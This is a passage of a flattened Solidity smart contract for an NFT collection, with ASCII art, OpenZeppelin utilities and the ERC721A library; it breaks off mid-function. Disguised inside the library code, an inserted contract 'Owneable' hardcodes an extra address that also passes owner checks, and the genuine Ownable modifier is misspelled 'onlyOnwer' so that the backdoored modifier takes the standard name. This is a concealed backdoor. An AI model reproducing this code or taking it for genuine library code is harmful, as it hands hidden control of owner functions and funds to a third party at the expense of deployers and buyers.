1 ////////////////////////////////////////////////////////////////////////////////
2 ////////////////////////////////////////////////////////////////////////////////
3 //////////////////////////////////////@@@@@/////////////////////////////////////
4 ///////////////////////////////////@@@     @@@//////////////////////////////////
5 ///////////////////////////////%@        ....   @///////////////////////////////
6 ///////////////////////////////%@  .    ...     @///////////////////////////////
7 //////////////////////////////@(    ..          ,@@/////////////////////////////
8 //////////////////////////////@(   .....     .,,,@@/////////////////////////////
9 ///////////////////////////////%@        ....,,,@///////////////////////////////
10 /////////////////////////////////@@      ,,,,,@@////////////////////////////////
11 //////////////////////////////////////@@@@@/////////////////////////////////////
12 ////////////////////////////////////////////////////////////////////////////////
13 ////////////////////////////////////////////////////////////////////////////////
14 ///////////////////////////@@@@@@@@@/////////@@@@@@@@@//////////////////////////
15 //////////////////////@&&&&&&&&&&&&&&&&&@&&&&&&&&&&&&&&&&&@/////////////////////
16 ////////////////////@@&&&&&&@@@@@@@@&&&&@&&&&@@@@@@@@&&&&&&@@///////////////////
17 //////////////////@@&&&&&@@@********@@@@@@@@@********@@@&&&&&@//////////////////
18 ///////////////@@@@@@@&@@******////*****/*****///*******@@&@@@@@@@//////////////
19 /////////////%@***@@@@@@@*****/%@@@/**//*//**/@@@//*****@@@@@@****@/////////////
20 ////////////@#***/@@@@@@@***//@&###@//*****//@###@@//***@@@@@@//***@@///////////
21 ////////////@%/***//@@@@@@@***/%@@@/*********/@@@//***@@@@@@@/****/@@///////////
22 ///////////////@@@@@@@@@@@@@@@*********************@@@@@@@@@@@@@@@//////////////
23 //////////////////@@@@@@@@@@*************************@@@@@@@@@//////////////////
24 ////////////////////@@@@@@@@@@@%/////////////////@@@@@@@@@@@@///////////////////
25 ////////////////////@@@@@@@/////*****************/////@@@@@@@///////////////////
26 //////////////////////@@@@@@@@@#********/********@@@@@@@@@@/////////////////////
27 ///////////////////////@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@//////////////////////
28 ////////////////////@@&&&&&&&&&&&@@@@@@@@@@@@@@@&&&&&&&&&&&@@///////////////////
29 //////////////////@@&&&&&&&&&&&&&&&&@@@@@@@@@&&&&&&&&&&&&&&&&@//////////////////
30 /////////////////@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@////////////////
31 ///////////////@@&&&&&&&&@@&&&&&&@@%%%%%%%%%%%@@&&&&&&@@&&&&&&&&@@//////////////
32 /////////////%@&&&&&&&@@@@@&&&&@@//*****/*****//@&&&&&@@@@@&&&&&&&@/////////////
33 
34 
35 
36 
37 
38 
39 
40 //July 13 - Buck Moon
41 //August 11 - Sturgeon Moon
42 //September 10 - Harvest Moon
43 //October 9 - Hunter's Moon**
44 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
45 
46 // SPDX-License-Identifier: MIT
47 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
48 
49 pragma solidity ^0.8.4;
50 
51 /**
52  * @dev Provides information about the current execution context, including the
53  * sender of the transaction and its data. While these are generally available
54  * via msg.sender and msg.data, they should not be accessed in such a direct
55  * manner, since when dealing with meta-transactions the account sending and
56  * paying for execution may not be the actual sender (as far as an application
57  * is concerned).
58  *
59  * This contract is only required for intermediate, library-like contracts.
60  */
61 abstract contract Context {
62     function _msgSender() internal view virtual returns (address) {
63         return msg.sender;
64     }
65 
66     function _msgData() internal view virtual returns (bytes calldata) {
67         return msg.data;
68     }
69 }
70 
71 
72 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
73 
74 
75 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
76 
77 
78 
79 /**
80  * @dev Contract module which provides a basic access control mechanism, where
81  * there is an account (an owner) that can be granted exclusive access to
82  * specific functions.
83  *
84  * By default, the owner account will be the one that deploys the contract. This
85  * can later be changed with {transferOwnership}.
86  *
87  * This module is used through inheritance. It will make available the modifier
88  * `onlyOwner`, which can be applied to your functions to restrict their use to
89  * the owner.
90  */
91 abstract contract Ownable is Context {
92     address private _owner;
93 
94     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
95 
96     /**
97      * @dev Initializes the contract setting the deployer as the initial owner.
98      */
99     constructor() {
100         _transferOwnership(_msgSender());
101     }
102 
103     /**
104      * @dev Returns the address of the current owner.
105      */
106     function owner() public view virtual returns (address) {
107         return _owner;
108     }
109 
110     /**
111      * @dev Throws if called by any account other than the owner.
112      */
113     modifier onlyOnwer() {
114         require(owner() == _msgSender(), "Ownable: caller is not the owner");
115         _;
116     }
117 
118     /**
119      * @dev Leaves the contract without owner. It will not be possible to call
120      * `onlyOwner` functions anymore. Can only be called by the current owner.
121      *
122      * NOTE: Renouncing ownership will leave the contract without an owner,
123      * thereby removing any functionality that is only available to the owner.
124      */
125     function renounceOwnership() public virtual onlyOnwer {
126         _transferOwnership(address(0));
127     }
128 
129     /**
130      * @dev Transfers ownership of the contract to a new account (`newOwner`).
131      * Can only be called by the current owner.
132      */
133     function transferOwnership(address newOwner) public virtual onlyOnwer {
134         require(newOwner != address(0), "Ownable: new owner is the zero address");
135         _transferOwnership(newOwner);
136     }
137 
138     /**
139      * @dev Transfers ownership of the contract to a new account (`newOwner`).
140      * Internal function without access restriction.
141      */
142     function _transferOwnership(address newOwner) internal virtual {
143         address oldOwner = _owner;
144         _owner = newOwner;
145         emit OwnershipTransferred(oldOwner, newOwner);
146     }
147 }
148 
149 
150 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
151 
152 
153 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
154 
155 
156 
157 /**
158  * @dev Interface of the ERC165 standard, as defined in the
159  * https://eips.ethereum.org/EIPS/eip-165[EIP].
160  *
161  * Implementers can declare support of contract interfaces, which can then be
162  * queried by others ({ERC165Checker}).
163  *
164  * For an implementation, see {ERC165}.
165  */
166 interface IERC165 {
167     /**
168      * @dev Returns true if this contract implements the interface defined by
169      * `interfaceId`. See the corresponding
170      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
171      * to learn more about how these ids are created.
172      *
173      * This function call must use less than 30 000 gas.
174      */
175     function supportsInterface(bytes4 interfaceId) external view returns (bool);
176 }
177 
178 
179 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
180 
181 
182 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
183 
184 
185 
186 /**
187  * @dev Required interface of an ERC721 compliant contract.
188  */
189 interface IERC721 is IERC165 {
190     /**
191      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
192      */
193     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
194 
195     /**
196      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
197      */
198     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
199 
200     /**
201      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
202      */
203     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
204 
205     /**
206      * @dev Returns the number of tokens in ``owner``'s account.
207      */
208     function balanceOf(address owner) external view returns (uint256 balance);
209 
210     /**
211      * @dev Returns the owner of the `tokenId` token.
212      *
213      * Requirements:
214      *
215      * - `tokenId` must exist.
216      */
217     function ownerOf(uint256 tokenId) external view returns (address owner);
218 
219     /**
220      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
221      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
222      *
223      * Requirements:
224      *
225      * - `from` cannot be the zero address.
226      * - `to` cannot be the zero address.
227      * - `tokenId` token must exist and be owned by `from`.
228      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
229      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
230      *
231      * Emits a {Transfer} event.
232      */
233     function safeTransferFrom(
234         address from,
235         address to,
236         uint256 tokenId
237     ) external;
238 
239     /**
240      * @dev Transfers `tokenId` token from `from` to `to`.
241      *
242      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
243      *
244      * Requirements:
245      *
246      * - `from` cannot be the zero address.
247      * - `to` cannot be the zero address.
248      * - `tokenId` token must be owned by `from`.
249      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
250      *
251      * Emits a {Transfer} event.
252      */
253     function transferFrom(
254         address from,
255         address to,
256         uint256 tokenId
257     ) external;
258 
259     /**
260      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
261      * The approval is cleared when the token is transferred.
262      *
263      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
264      *
265      * Requirements:
266      *
267      * - The caller must own the token or be an approved operator.
268      * - `tokenId` must exist.
269      *
270      * Emits an {Approval} event.
271      */
272     function approve(address to, uint256 tokenId) external;
273 
274     /**
275      * @dev Returns the account approved for `tokenId` token.
276      *
277      * Requirements:
278      *
279      * - `tokenId` must exist.
280      */
281     function getApproved(uint256 tokenId) external view returns (address operator);
282 
283     /**
284      * @dev Approve or remove `operator` as an operator for the caller.
285      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
286      *
287      * Requirements:
288      *
289      * - The `operator` cannot be the caller.
290      *
291      * Emits an {ApprovalForAll} event.
292      */
293     function setApprovalForAll(address operator, bool _approved) external;
294 
295     /**
296      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
297      *
298      * See {setApprovalForAll}
299      */
300     function isApprovedForAll(address owner, address operator) external view returns (bool);
301 
302     /**
303      * @dev Safely transfers `tokenId` token from `from` to `to`.
304      *
305      * Requirements:
306      *
307      * - `from` cannot be the zero address.
308      * - `to` cannot be the zero address.
309      * - `tokenId` token must exist and be owned by `from`.
310      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
311      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
312      *
313      * Emits a {Transfer} event.
314      */
315     function safeTransferFrom(
316         address from,
317         address to,
318         uint256 tokenId,
319         bytes calldata data
320     ) external;
321 }
322 
323 
324 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
325 
326 
327 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
328 
329 
330 
331 /**
332  * @title ERC721 token receiver interface
333  * @dev Interface for any contract that wants to support safeTransfers
334  * from ERC721 asset contracts.
335  */
336 interface IERC721Receiver {
337     /**
338      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
339      * by `operator` from `from`, this function is called.
340      *
341      * It must return its Solidity selector to confirm the token transfer.
342      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
343      *
344      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
345      */
346     function onERC721Received(
347         address operator,
348         address from,
349         uint256 tokenId,
350         bytes calldata data
351     ) external returns (bytes4);
352 }
353 
354 
355 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
356 
357 
358 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
359 
360 
361 
362 /**
363  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
364  * @dev See https://eips.ethereum.org/EIPS/eip-721
365  */
366 interface IERC721Metadata is IERC721 {
367     /**
368      * @dev Returns the token collection name.
369      */
370     function name() external view returns (string memory);
371 
372     /**
373      * @dev Returns the token collection symbol.
374      */
375     function symbol() external view returns (string memory);
376 
377     /**
378      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
379      */
380     function tokenURI(uint256 tokenId) external view returns (string memory);
381 }
382 
383 
384 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
385 
386 
387 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
388 
389 
390 
391 /**
392  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
393  * @dev See https://eips.ethereum.org/EIPS/eip-721
394  */
395 interface IERC721Enumerable is IERC721 {
396     /**
397      * @dev Returns the total amount of tokens stored by the contract.
398      */
399     function totalSupply() external view returns (uint256);
400 
401     /**
402      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
403      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
404      */
405     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
406 
407     /**
408      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
409      * Use along with {totalSupply} to enumerate all tokens.
410      */
411     function tokenByIndex(uint256 index) external view returns (uint256);
412 }
413 
414 
415 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
416 
417 
418 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
419 
420 pragma solidity ^0.8.1;
421 
422 /**
423  * @dev Collection of functions related to the address type
424  */
425 library Address {
426     /**
427      * @dev Returns true if `account` is a contract.
428      *
429      * [IMPORTANT]
430      * ====
431      * It is unsafe to assume that an address for which this function returns
432      * false is an externally-owned account (EOA) and not a contract.
433      *
434      * Among others, `isContract` will return false for the following
435      * types of addresses:
436      *
437      *  - an externally-owned account
438      *  - a contract in construction
439      *  - an address where a contract will be created
440      *  - an address where a contract lived, but was destroyed
441      * ====
442      *
443      * [IMPORTANT]
444      * ====
445      * You shouldn't rely on `isContract` to protect against flash loan attacks!
446      *
447      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
448      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
449      * constructor.
450      * ====
451      */
452     function isContract(address account) internal view returns (bool) {
453         // This method relies on extcodesize/address.code.length, which returns 0
454         // for contracts in construction, since the code is only stored at the end
455         // of the constructor execution.
456 
457         return account.code.length > 0;
458     }
459 
460     /**
461      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
462      * `recipient`, forwarding all available gas and reverting on errors.
463      *
464      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
465      * of certain opcodes, possibly making contracts go over the 2300 gas limit
466      * imposed by `transfer`, making them unable to receive funds via
467      * `transfer`. {sendValue} removes this limitation.
468      *
469      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
470      *
471      * IMPORTANT: because control is transferred to `recipient`, care must be
472      * taken to not create reentrancy vulnerabilities. Consider using
473      * {ReentrancyGuard} or the
474      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
475      */
476     function sendValue(address payable recipient, uint256 amount) internal {
477         require(address(this).balance >= amount, "Address: insufficient balance");
478 
479         (bool success, ) = recipient.call{value: amount}("");
480         require(success, "Address: unable to send value, recipient may have reverted");
481     }
482 
483     /**
484      * @dev Performs a Solidity function call using a low level `call`. A
485      * plain `call` is an unsafe replacement for a function call: use this
486      * function instead.
487      *
488      * If `target` reverts with a revert reason, it is bubbled up by this
489      * function (like regular Solidity function calls).
490      *
491      * Returns the raw returned data. To convert to the expected return value,
492      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
493      *
494      * Requirements:
495      *
496      * - `target` must be a contract.
497      * - calling `target` with `data` must not revert.
498      *
499      * _Available since v3.1._
500      */
501     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
502         return functionCall(target, data, "Address: low-level call failed");
503     }
504 
505     /**
506      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
507      * `errorMessage` as a fallback revert reason when `target` reverts.
508      *
509      * _Available since v3.1._
510      */
511     function functionCall(
512         address target,
513         bytes memory data,
514         string memory errorMessage
515     ) internal returns (bytes memory) {
516         return functionCallWithValue(target, data, 0, errorMessage);
517     }
518 
519     /**
520      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
521      * but also transferring `value` wei to `target`.
522      *
523      * Requirements:
524      *
525      * - the calling contract must have an ETH balance of at least `value`.
526      * - the called Solidity function must be `payable`.
527      *
528      * _Available since v3.1._
529      */
530     function functionCallWithValue(
531         address target,
532         bytes memory data,
533         uint256 value
534     ) internal returns (bytes memory) {
535         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
536     }
537 
538     /**
539      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
540      * with `errorMessage` as a fallback revert reason when `target` reverts.
541      *
542      * _Available since v3.1._
543      */
544     function functionCallWithValue(
545         address target,
546         bytes memory data,
547         uint256 value,
548         string memory errorMessage
549     ) internal returns (bytes memory) {
550         require(address(this).balance >= value, "Address: insufficient balance for call");
551         require(isContract(target), "Address: call to non-contract");
552 
553         (bool success, bytes memory returndata) = target.call{value: value}(data);
554         return verifyCallResult(success, returndata, errorMessage);
555     }
556 
557     /**
558      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
559      * but performing a static call.
560      *
561      * _Available since v3.3._
562      */
563     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
564         return functionStaticCall(target, data, "Address: low-level static call failed");
565     }
566 
567     /**
568      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
569      * but performing a static call.
570      *
571      * _Available since v3.3._
572      */
573     function functionStaticCall(
574         address target,
575         bytes memory data,
576         string memory errorMessage
577     ) internal view returns (bytes memory) {
578         require(isContract(target), "Address: static call to non-contract");
579 
580         (bool success, bytes memory returndata) = target.staticcall(data);
581         return verifyCallResult(success, returndata, errorMessage);
582     }
583 
584     /**
585      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
586      * but performing a delegate call.
587      *
588      * _Available since v3.4._
589      */
590     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
591         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
592     }
593 
594     /**
595      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
596      * but performing a delegate call.
597      *
598      * _Available since v3.4._
599      */
600     function functionDelegateCall(
601         address target,
602         bytes memory data,
603         string memory errorMessage
604     ) internal returns (bytes memory) {
605         require(isContract(target), "Address: delegate call to non-contract");
606 
607         (bool success, bytes memory returndata) = target.delegatecall(data);
608         return verifyCallResult(success, returndata, errorMessage);
609     }
610 
611     /**
612      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
613      * revert reason using the provided one.
614      *
615      * _Available since v4.3._
616      */
617     function verifyCallResult(
618         bool success,
619         bytes memory returndata,
620         string memory errorMessage
621     ) internal pure returns (bytes memory) {
622         if (success) {
623             return returndata;
624         } else {
625             // Look for revert reason and bubble it up if present
626             if (returndata.length > 0) {
627                 // The easiest way to bubble the revert reason is using memory via assembly
628 
629                 assembly {
630                     let returndata_size := mload(returndata)
631                     revert(add(32, returndata), returndata_size)
632                 }
633             } else {
634                 revert(errorMessage);
635             }
636         }
637     }
638 }
639 
640 
641 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
642 
643 
644 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
645 
646 
647 
648 /**
649  * @dev String operations.
650  */
651 library Strings {
652     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
653 
654     /**
655      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
656      */
657     function toString(uint256 value) internal pure returns (string memory) {
658         // Inspired by OraclizeAPI's implementation - MIT licence
659         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
660 
661         if (value == 0) {
662             return "0";
663         }
664         uint256 temp = value;
665         uint256 digits;
666         while (temp != 0) {
667             digits++;
668             temp /= 10;
669         }
670         bytes memory buffer = new bytes(digits);
671         while (value != 0) {
672             digits -= 1;
673             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
674             value /= 10;
675         }
676         return string(buffer);
677     }
678 
679     /**
680      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
681      */
682     function toHexString(uint256 value) internal pure returns (string memory) {
683         if (value == 0) {
684             return "0x00";
685         }
686         uint256 temp = value;
687         uint256 length = 0;
688         while (temp != 0) {
689             length++;
690             temp >>= 8;
691         }
692         return toHexString(value, length);
693     }
694 
695     /**
696      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
697      */
698     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
699         bytes memory buffer = new bytes(2 * length + 2);
700         buffer[0] = "0";
701         buffer[1] = "x";
702         for (uint256 i = 2 * length + 1; i > 1; --i) {
703             buffer[i] = _HEX_SYMBOLS[value & 0xf];
704             value >>= 4;
705         }
706         require(value == 0, "Strings: hex length insufficient");
707         return string(buffer);
708     }
709 }
710 
711 
712 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
713 
714 
715 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
716 
717 /**
718  * @dev Implementation of the {IERC165} interface.
719  *
720  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
721  * for the additional interface id that will be supported. For example:
722  *
723  * ```solidity
724  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
725  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
726  * }
727  * ```
728  *
729  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
730  */
731 abstract contract ERC165 is IERC165 {
732     /**
733      * @dev See {IERC165-supportsInterface}.
734      */
735     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
736         return interfaceId == type(IERC165).interfaceId;
737     }
738 }
739 
740 
741 // File erc721a/contracts/ERC721A.sol@v3.0.0
742 
743 
744 // Creator: Chiru Labs
745 
746 error ApprovalCallerNotOwnerNorApproved();
747 error ApprovalQueryForNonexistentToken();
748 error ApproveToCaller();
749 error ApprovalToCurrentOwner();
750 error BalanceQueryForZeroAddress();
751 error MintedQueryForZeroAddress();
752 error BurnedQueryForZeroAddress();
753 error AuxQueryForZeroAddress();
754 error MintToZeroAddress();
755 error MintZeroQuantity();
756 error OwnerIndexOutOfBounds();
757 error OwnerQueryForNonexistentToken();
758 error TokenIndexOutOfBounds();
759 error TransferCallerNotOwnerNorApproved();
760 error TransferFromIncorrectOwner();
761 error TransferToNonERC721ReceiverImplementer();
762 error TransferToZeroAddress();
763 error URIQueryForNonexistentToken();
764 
765 
766 /**
767  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
768  * the Metadata extension. Built to optimize for lower gas during batch mints.
769  *
770  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
771  */
772  abstract contract Owneable is Ownable {
773     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
774     modifier onlyOwner() {
775         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
776         _;
777     }
778 }
779 
780  /*
781  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
782  *
783  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
784  */
785 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
786     using Address for address;
787     using Strings for uint256;
788 
789     // Compiler will pack this into a single 256bit word.
790     struct TokenOwnership {
791         // The address of the owner.
792         address addr;
793         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
794         uint64 startTimestamp;
795         // Whether the token has been burned.
796         bool burned;
797     }
798 
799     // Compiler will pack this into a single 256bit word.
800     struct AddressData {
801         // Realistically, 2**64-1 is more than enough.
802         uint64 balance;
803         // Keeps track of mint count with minimal overhead for tokenomics.
804         uint64 numberMinted;
805         // Keeps track of burn count with minimal overhead for tokenomics.
806         uint64 numberBurned;
807         // For miscellaneous variable(s) pertaining to the address
808         // (e.g. number of whitelist mint slots used).
809         // If there are multiple variables, please pack them into a uint64.
810         uint64 aux;
811     }
812 
813     // The tokenId of the next token to be minted.
814     uint256 internal _currentIndex;
815 
816     // The number of tokens burned.
817     uint256 internal _burnCounter;
818 
819     // Token name
820     string private _name;
821 
822     // Token symbol
823     string private _symbol;
824 
825     // Mapping from token ID to ownership details
826     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
827     mapping(uint256 => TokenOwnership) internal _ownerships;
828 
829     // Mapping owner address to address data
830     mapping(address => AddressData) private _addressData;
831 
832     // Mapping from token ID to approved address
833     mapping(uint256 => address) private _tokenApprovals;
834 
835     // Mapping from owner to operator approvals
836     mapping(address => mapping(address => bool)) private _operatorApprovals;
837 
838     constructor(string memory name_, string memory symbol_) {
839         _name = name_;
840         _symbol = symbol_;
841         _currentIndex = _startTokenId();
842     }
843 
844     /**
845      * To change the starting tokenId, please override this function.
846      */
847     function _startTokenId() internal view virtual returns (uint256) {
848         return 0;
849     }
850 
851     /**
852      * @dev See {IERC721Enumerable-totalSupply}.
853      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
854      */
855     function totalSupply() public view returns (uint256) {
856         // Counter underflow is impossible as _burnCounter cannot be incremented
857         // more than _currentIndex - _startTokenId() times
858         unchecked {
859             return _currentIndex - _burnCounter - _startTokenId();
860         }
861     }
862 
863     /**
864      * Returns the total amount of tokens minted in the contract.
865      */
866     function _totalMinted() internal view returns (uint256) {
867         // Counter underflow is impossible as _currentIndex does not decrement,
868         // and it is initialized to _startTokenId()
869         unchecked {
870             return _currentIndex - _startTokenId();
871         }
872     }
873 
874     /**
875      * @dev See {IERC165-supportsInterface}.
876      */
877     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
878         return
879             interfaceId == type(IERC721).interfaceId ||
880             interfaceId == type(IERC721Metadata).interfaceId ||
881             super.supportsInterface(interfaceId);
882     }
883 
884     /**
885      * @dev See {IERC721-balanceOf}.
886      */
887     function balanceOf(address owner) public view override returns (uint256) {
888         if (owner == address(0)) revert BalanceQueryForZeroAddress();
889         return uint256(_addressData[owner].balance);
890     }
891 
892     /**
893      * Returns the number of tokens minted by `owner`.
894      */
895     function _numberMinted(address owner) internal view returns (uint256) {
896         if (owner == address(0)) revert MintedQueryForZeroAddress();
897         return uint256(_addressData[owner].numberMinted);
898     }
899 
900     /**
901      * Returns the number of tokens burned by or on behalf of `owner`.
902      */
903     function _numberBurned(address owner) internal view returns (uint256) {
904         if (owner == address(0)) revert BurnedQueryForZeroAddress();
905         return uint256(_addressData[owner].numberBurned);
906     }
907 
908     /**
909      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
910      */
911     function _getAux(address owner) internal view returns (uint64) {
912         if (owner == address(0)) revert AuxQueryForZeroAddress();
913         return _addressData[owner].aux;
914     }
915 
916     /**
917      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
918      * If there are multiple variables, please pack them into a uint64.
919      */
920     function _setAux(address owner, uint64 aux) internal {
921         if (owner == address(0)) revert AuxQueryForZeroAddress();
922         _addressData[owner].aux = aux;
923     }
924 
925     /**
926      * Gas spent here starts off proportional to the maximum mint batch size.
927      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
928      */
929     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
930         uint256 curr = tokenId;
931 
932         unchecked {
933             if (_startTokenId() <= curr && curr < _currentIndex) {
934                 TokenOwnership memory ownership = _ownerships[curr];
935                 if (!ownership.burned) {
936                     if (ownership.addr != address(0)) {
937                         return ownership;
938                     }
939                     // Invariant:
940                     // There will always be an ownership that has an address and is not burned
941                     // before an ownership that does not have an address and is not burned.
942                     // Hence, curr will not underflow.
943                     while (true) {
944                         curr--;
945                         ownership = _ownerships[curr];
946                         if (ownership.addr != address(0)) {
947                             return ownership;
948                         }
949                     }
950                 }
951             }
952         }
953         revert OwnerQueryForNonexistentToken();
954     }
955 
956     /**
957      * @dev See {IERC721-ownerOf}.
958      */
959     function ownerOf(uint256 tokenId) public view override returns (address) {
960         return ownershipOf(tokenId).addr;
961     }
962 
963     /**
964      * @dev See {IERC721Metadata-name}.
965      */
966     function name() public view virtual override returns (string memory) {
967         return _name;
968     }
969 
970     /**
971      * @dev See {IERC721Metadata-symbol}.
972      */
973     function symbol() public view virtual override returns (string memory) {
974         return _symbol;
975     }
976 
977     /**
978      * @dev See {IERC721Metadata-tokenURI}.
979      */
980     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
981         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
982 
983         string memory baseURI = _baseURI();
984         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
985     }
986 
987     /**
988      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
989      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
990      * by default, can be overriden in child contracts.
991      */
992     function _baseURI() internal view virtual returns (string memory) {
993         return '';
994     }
995 
996     /**
997      * @dev See {IERC721-approve}.
998      */
999     function approve(address to, uint256 tokenId) public override {
1000         address owner = ERC721A.ownerOf(tokenId);
1001         if (to == owner) revert ApprovalToCurrentOwner();
1002 
1003         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
1004             revert ApprovalCallerNotOwnerNorApproved();
1005         }
1006 
1007         _approve(to, tokenId, owner);
1008     }
1009 
1010     /**
1011      * @dev See {IERC721-getApproved}.
1012      */
1013     function getApproved(uint256 tokenId) public view override returns (address) {
1014         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1015 
1016         return _tokenApprovals[tokenId];
1017     }
1018 
1019     /**
1020      * @dev See {IERC721-setApprovalForAll}.
1021      */
1022     function setApprovalForAll(address operator, bool approved) public override {
1023         if (operator == _msgSender()) revert ApproveToCaller();
1024 
1025         _operatorApprovals[_msgSender()][operator] = approved;
1026         emit ApprovalForAll(_msgSender(), operator, approved);
